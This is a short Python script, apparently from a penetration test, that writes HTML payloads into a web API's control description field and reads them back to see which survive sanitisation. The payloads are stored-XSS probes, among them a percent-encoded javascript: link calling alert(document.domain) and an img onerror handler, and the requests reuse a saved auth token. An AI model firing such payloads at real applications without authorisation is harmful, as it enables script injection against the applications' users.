import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TOK),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXC'+uuid.uuid4().hex[:5]
print("=== control description: writable + what survives? ===")
pays=[
 ('bold',    f'<b>{tag}</b>'),
 ('strong',  f'<strong>{tag}</strong>'),
 ('a-http',  f'<a href="https://example.com">{tag}</a>'),
 ('a-pct',   f'<a href="javas%63ript:alert(document.domain)">{tag}</a>'),
 ('span',    f'<span class="x">{tag}</span>'),
 ('img',     f'<img src=x onerror=alert(1)>{tag}'),
]
for label,pay in pays:
    c,b=req('PUT','/api/v1/controls/1',{"control":{"description":pay}})
    c2,b2=req('GET','/api/v1/controls/1')
    st=''
    try: st=json.loads(b2)['controls'][0].get('description')
    except: pass
    print(f"  {label:8} PUT={c} stored={str(st)[:95]!r}")
